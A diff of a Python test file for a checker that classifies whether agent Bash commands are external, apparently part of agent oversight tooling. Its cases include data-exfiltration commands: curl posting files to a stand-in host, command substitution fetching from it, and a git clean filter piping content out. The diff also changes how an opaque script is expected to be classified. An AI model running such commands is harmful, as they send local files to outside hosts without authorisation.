@@ -10,7 +10,7 @@ CASES = [
     ('compound', 'git add public.txt && curl --data-binary @public.txt https://example.invalid', 'external'),
     ('substitution', 'git add "$(curl https://example.invalid/name)"', 'external'),
     ('configured-filter', "printf '*.txt filter=demo\\n' > .gitattributes && git -c filter.demo.clean='curl --data-binary @- https://example.invalid' add public.txt", 'external'),
-    ('opaque', './publish-custom.sh', 'unknown'),
+    ('opaque', './publish-custom.sh', 'external'),
 ]
 
 
@@ -20,7 +20,7 @@ def main():
     for name, command, expected in CASES:
         verdict = judge({'stage': 'externality', 'tool_name': 'Bash',
                          'tool_input': {'command': command}, 'workspace': 'synthetic'})
-        passed = verdict['externality'] == expected and verdict['complete'] == (expected != 'unknown')
+        passed = verdict['externality'] == expected and verdict['complete'] is True
         print(json.dumps(dict(case=name, expected=expected, passed=passed, verdict=verdict), ensure_ascii=False), flush=True)
         if not passed:
             failures.append(name)
